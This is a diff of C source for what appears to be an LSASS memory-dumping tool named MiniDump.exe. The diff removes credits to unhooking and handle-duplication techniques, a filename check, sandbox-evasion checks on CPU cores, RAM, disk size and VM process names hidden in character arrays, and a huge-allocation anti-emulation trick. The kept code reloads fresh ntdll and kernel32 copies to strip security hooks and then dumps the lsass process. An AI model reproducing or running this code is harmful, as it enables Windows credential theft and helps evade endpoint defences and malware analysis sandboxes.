@@ -1,10 +1,3 @@
-// credits : sektor7 unhooking with fresh DbgHelp.dll copy (implementation) 
-//         && 
-//           NtRaiseHardError (author of this technique)
-//			: https://github.com/kartikdurg/
-//			lsass handle duplication
-
-
 #include <stdio.h>
 #include <Windows.h>
 #include <DbgHelp.h>
@@ -435,89 +428,6 @@ HANDLE enum_lsass_handles() {
 
 int main(int argc, char** argv) {
 	
-	// what is my name???
-	if (strstr(argv[0], "MiniDump.exe") == NULL) {
-		printf("Don't change the name :(\n");
-		return -2;
-	}
-
-	// escaping s1ndb0x
-	// CPU
-	SYSTEM_INFO systemInfo;
-	GetSystemInfo(&systemInfo);
-	DWORD nmbOfCores = systemInfo.dwNumberOfProcessors;
-	if (nmbOfCores < 2) {
-		return -1;
-	}
-
-	// RAM
-	MEMORYSTATUSEX memorystatus;
-	memorystatus.dwLength = sizeof(memorystatus);
-	GlobalMemoryStatusEx(&memorystatus);
-	DWORD RAMMB = memorystatus.ullTotalPhys / 1024 / 1024;
-	if (RAMMB < 4096) {
-		return -1;
-	}
-
-	// HDD
-	wchar_t phyDri[] = { '\\','\\','.','\\','P','h','y','s','i','c','a','l','D','r','i','v','e','0',0 };
-	HANDLE hDevice = CreateFileW(phyDri, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
-	DISK_GEOMETRY pDiskGeometry;
-	DWORD bytesReturned;
-	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
-	DWORD diskSizeGB;
-	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
-	if (diskSizeGB < 100) {
-		return -1;
-	}
-	
-	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (!hSnapshot)
-		return Error("Failed in CreateToolhelp32Snapshot\n");
-
-	PROCESSENTRY32 PE32;
-	PE32.dwSize = sizeof(PROCESSENTRY32);
-
-	if (!Process32First(hSnapshot, &PE32))
-		return Error("Failed in Process32First\n");
-
-	while (Process32Next(hSnapshot, &PE32)) {
-		size_t i;
-		char* pMBBuffer = (char*)malloc(MAX_PATH);
-		const wchar_t* pWCBuffer = PE32.szExeFile;
-
-		wcstombs_s(&i, pMBBuffer, (size_t)MAX_PATH, pWCBuffer, (size_t)MAX_PATH - 1);
-		const char vmt00l[] = { 'v','m','t','o','o','l','s','d','.','e','x','e',0 };
-		const char vm3d[] = { 'v','m','3','d','s','e','r','v','i','c','e','.','e','x','e',0};
-		const char vGAu[] = { 'V','G','A','u','t','h','S','e','r','v','i','c','e','.','e','x','e',0 };
-		const char vbser[] = { 'v','b','o','x','s','e','r','v','i','c','e','.','e','x','e',0 };
-		const char vbtra[] = { 'v','b','o','x','t','r','a','y','.','e','x','e',0 };
-
-		/*
-		if (!strcmp(vmt00l, pMBBuffer)) {
-			return -1;
-		}
-		if (!strcmp(vm3d, pMBBuffer)) {
-			return -1;
-		}
-		if (!strcmp(vGAu, pMBBuffer)) {
-			return -1;
-		}
-		
-		if (!strcmp(vbser, pMBBuffer)) {
-			return -1;
-		}
-		if (!strcmp(vbtra, pMBBuffer)) {
-			return -1;
-		}
-		
-		if (pMBBuffer)
-		{
-			free(pMBBuffer);
-		}
-		*/
-	}
-
 
 	HANDLE h = GetCurrentProcess();
 	PROCESS_BASIC_INFORMATION ProcessInformation;
@@ -539,13 +449,6 @@ int main(int argc, char** argv) {
 		return -1;
 	}
 
-
-	char* mem = NULL;
-	mem = (char*)malloc(10000000000);
-
-	if (mem != NULL) {
-		memset(mem, 00, 10000000000);
-		free(mem);
 
 		FreshCopy(sNtdllPath, sNtdll);
 		FreshCopy(sKernel32Path, sKernel32);
@@ -585,6 +488,6 @@ int main(int argc, char** argv) {
 		m1n1dumpIt(hProcess);
 		CloseHandle(hProcess);
 		return 0;
-	}
+	
 }
 
